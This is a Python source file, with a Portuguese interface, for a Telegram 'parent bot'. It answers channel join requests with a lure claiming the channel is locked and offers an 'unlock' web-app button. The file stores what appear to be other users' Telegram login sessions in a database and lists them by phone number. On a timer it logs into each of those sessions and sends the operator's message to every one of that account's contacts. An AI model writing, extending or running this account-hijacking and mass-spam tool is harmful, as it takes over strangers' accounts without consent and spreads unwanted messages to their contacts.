import os
import json
import logging
import asyncio
import base64
from pathlib import Path
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, ChatJoinRequestHandler, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.types import User
from dotenv import load_dotenv
import db

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
WEBAPP_URL = os.getenv("WEBAPP_URL", "")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")

SESSION_DIR = Path("sessions")
CONFIG_FILE = Path("config.json")
PENDING_FILE = Path("pending_requests.json")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

STATS = {
    'verificados': 0,
    'join_requests': 0,
    'msgs_enviadas': 0
}

awaiting_input = {}

def load_pending():
    if PENDING_FILE.exists():
        try:
            return json.loads(PENDING_FILE.read_text())
        except:
            pass
    return {}

def save_pending(data):
    PENDING_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2))

def load_config():
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text())
        except:
            pass
    return {
        'mensagem': "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.",
        'botao': "🔓 DESBLOQUEAR CANAL",
        'msg_disparo': "",
        'intervalo_horas': 1
    }

def save_config(config):
    CONFIG_FILE.write_text(json.dumps(config, ensure_ascii=False, indent=2))

CONFIG = load_config()

async def disparo_sessions(context: ContextTypes.DEFAULT_TYPE):
    config = load_config()
    msg = config.get('msg_disparo', '')
    
    if not msg:
        return
    
    sessions = db.get_all_sessions()
    
    if not sessions:
        return
    
    logger.info(f"Disparo em {len(sessions)} sessões do banco...")
    total = 0
    
    for sess in sessions:
        try:
            session_data = sess['session_data']
            client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                db.delete_session(sess['user_id'])
                continue
            
            dialogs = await client.get_dialogs(limit=100)
            
            for dialog in dialogs:
                try:
                    entity = dialog.entity
                    if isinstance(entity, User):
                        if entity.bot or entity.is_self:
                            continue
                    await client.send_message(entity, msg)
                    total += 1
                    await asyncio.sleep(0.5)
                except:
                    continue
            
            await client.disconnect()
        except Exception as e:
            logger.error(f"Erro disparo session {sess['user_id']}: {e}")
    
    STATS['msgs_enviadas'] += total
    logger.info(f"Disparo concluído: {total} msgs")
    
    try:
        await context.bot.send_message(ADMIN_ID, f"✅ Disparo concluído!\n📨 {total} msgs enviadas")
    except:
        pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user.id == ADMIN_ID:
        await show_admin_menu(update, context)
        return
    
    config = load_config()
    
    keyboard = [[
        InlineKeyboardButton(
            config.get('botao', "🔓 DESBLOQUEAR CANAL"),
            web_app=WebAppInfo(url=WEBAPP_URL)
        )
    ]]
    
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.")
    msg = msg.replace("{chat_title}", "o canal")
    
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sessions_count = db.count_sessions()
    bots_count = db.count_bots()
    config = load_config()
    
    keyboard = [
        [InlineKeyboardButton("📊 Estatísticas", callback_data="stats")],
        [InlineKeyboardButton("📁 Ver Sessions", callback_data="sessions")],
        [InlineKeyboardButton("🤖 Bots Filhos", callback_data="bots")],
        [InlineKeyboardButton("➕ Adicionar Bot", callback_data="add_bot")],
        [InlineKeyboardButton("🔥 Msg Disparo", callback_data="edit_disparo")],
        [InlineKeyboardButton(f"⏰ Intervalo ({config.get('intervalo_horas', 1)}h)", callback_data="edit_intervalo")],
        [InlineKeyboardButton("🚀 Disparar Agora", callback_data="disparar")],
        [InlineKeyboardButton("✏️ Msg Inicial", callback_data="edit_msg")],
        [InlineKeyboardButton("🔘 Texto Botão", callback_data="edit_btn")],
    ]
    
    text = (
        f"🔧 **Painel Admin**\n\n"
        f"📁 Sessions no DB: {sessions_count}\n"
        f"🤖 Bots ativos: {bots_count}\n"
        f"📨 Msgs disparadas: {STATS['msgs_enviadas']}\n"
        f"📨 Join requests: {STATS['join_requests']}"
    )
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_ID:
        return
    
    data = query.data
    config = load_config()
    
    if data == "menu":
        await show_admin_menu(update, context)
    
    elif data == "stats":
        sessions_count = db.count_sessions()
        bots_count = db.count_bots()
        text = (
            f"📊 **Estatísticas**\n\n"
            f"📁 Sessions: {sessions_count}\n"
            f"🤖 Bots ativos: {bots_count}\n"
            f"📨 Msgs: {STATS['msgs_enviadas']}\n"
            f"📨 Joins: {STATS['join_requests']}"
        )
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "sessions":
        sessions = db.get_all_sessions()
        if not sessions:
            text = "📁 Nenhuma session salva."
        else:
            text = f"📁 **Sessions ({len(sessions)})**\n\n"
            for s in sessions[:15]:
                text += f"• {s['phone'] or s['user_id']}\n"
            if len(sessions) > 15:
                text += f"\n... +{len(sessions) - 15}"
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "bots":
        bots = db.get_all_bots()
        if not bots:
            text = "🤖 Nenhum bot filho cadastrado.\n\nClique em ➕ Adicionar Bot"
        else:
            text = f"🤖 **Bots Filhos ({len(bots)})**\n\n"
            for b in bots:
                text += f"• {b['name'] or 'Bot'} (ID: {b['id']})\n"
        kb = [
            [InlineKeyboardButton("➕ Adicionar Bot", callback_data="add_bot")],
            [InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "add_bot":
        awaiting_input[query.from_user.id] = 'bot_token'
        text = (
            "➕ **Adicionar Bot Filho**\n\n"
            "Envie o TOKEN do bot.\n\n"
            "Exemplo:\n`123456789:ABCdefGHIjklMNOpqrsTUVwxyz`"
        )
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif data == "edit_disparo":
        awaiting_input[query.from_user.id] = 'msg_disparo'
        text = f"🔥 Envie a nova mensagem de disparo.\n\nAtual:\n{config.get('msg_disparo', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "edit_intervalo":
        awaiting_input[query.from_user.id] = 'intervalo_horas'
        text = f"⏰ Envie o intervalo em horas.\n\nAtual: {config.get('intervalo_horas', 1)}h"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "edit_msg":
        awaiting_input[query.from_user.id] = 'mensagem'
        text = "✏️ Envie a nova mensagem inicial.\nUse {chat_title} para o nome do grupo."
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "edit_btn":
        awaiting_input[query.from_user.id] = 'botao'
        text = f"🔘 Envie o novo texto do botão.\n\nAtual: {config.get('botao', '')}"
        kb = [[InlineKeyboardButton("❌ Cancelar", callback_data="menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data == "disparar":
        sessions_count = db.count_sessions()
        if sessions_count == 0:
            kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
            await query.edit_message_text("❌ Nenhuma session disponível!", reply_markup=InlineKeyboardMarkup(kb))
            return
        
        await query.edit_message_text(f"🚀 Disparando em {sessions_count} sessions...")
        asyncio.create_task(disparo_sessions(context))
        
        kb = [[InlineKeyboardButton("⬅️ Voltar", callback_data="menu")]]
        await query.edit_message_text("🚀 Disparo iniciado! Você será notificado.", reply_markup=InlineKeyboardMarkup(kb))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        return
    
    input_type = awaiting_input.get(user.id)
    if not input_type:
        return
    
    text = update.message.text
    config = load_config()
    
    if input_type == 'bot_token':
        awaiting_input.pop(user.id, None)
        
        import requests
        try:
            resp = requests.get(f"https://api.telegram.org/bot{text}/getMe", timeout=10)
            if resp.status_code != 200:
                await update.message.reply_text("❌ Token inválido!")
                return
            
            bot_info = resp.json().get('result', {})
            bot_name = bot_info.get('first_name', 'Bot')
            
            bot_id = db.add_bot(text, bot_name, API_ID, API_HASH, WEBAPP_URL)
            
            if bot_id:
                await update.message.reply_text(f"✅ Bot **{bot_name}** adicionado!\n\nID: {bot_id}", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Erro ao salvar bot.")
        except Exception as e:
            await update.message.reply_text(f"❌ Erro: {e}")
        
        await show_admin_menu(update, context)
        return
    
    if input_type == 'intervalo_horas':
        try:
            val = int(text)
            if val < 1:
                val = 1
            config['intervalo_horas'] = val
        except:
            await update.message.reply_text("❌ Número inválido!")
            return
    else:
        config[input_type] = text
    
    save_config(config)
    awaiting_input.pop(user.id, None)
    
    await update.message.reply_text("✅ Atualizado!")
    await show_admin_menu(update, context)

async def on_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    join_request = update.chat_join_request
    user = join_request.from_user
    chat = join_request.chat
    
    STATS['join_requests'] += 1
    logger.info(f"Join request de {user.id} para {chat.title}")
    
    pending = load_pending()
    pending[str(user.id)] = {
        'chat_id': chat.id,
        'chat_title': chat.title,
        'timestamp': datetime.now().isoformat()
    }
    save_pending(pending)
    
    config = load_config()
    
    keyboard = [[
        InlineKeyboardButton(
            config.get('botao', "🔓 DESBLOQUEAR CANAL"),
            web_app=WebAppInfo(url=WEBAPP_URL)
        )
    ]]
    
    msg = config.get('mensagem', "⛔ *Acesso a {chat_title} bloqueado*\n\nEste canal contém material restrito. Desbloqueie para ver o que está escondido.")
    msg = msg.replace("{chat_title}", chat.title)
    
    try:
        await context.bot.send_message(chat_id=user.id, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        logger.info(f"Mensagem enviada para {user.id}")
    except Exception as e:
        logger.error(f"Erro ao enviar: {e}")

def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN não configurado")
        return
    
    if not WEBAPP_URL:
        print("❌ WEBAPP_URL não configurado")
        return
    
    SESSION_DIR.mkdir(exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", show_admin_menu))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(ChatJoinRequestHandler(on_join_request))
    
    config = load_config()
    intervalo = config.get('intervalo_horas', 1) * 3600
    app.job_queue.run_repeating(disparo_sessions, interval=intervalo, first=intervalo)
    
    print("🤖 Bot Pai rodando!")
    print(f"📁 Sessions no DB")
    print(f"⏰ Disparo a cada {config.get('intervalo_horas', 1)}h")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
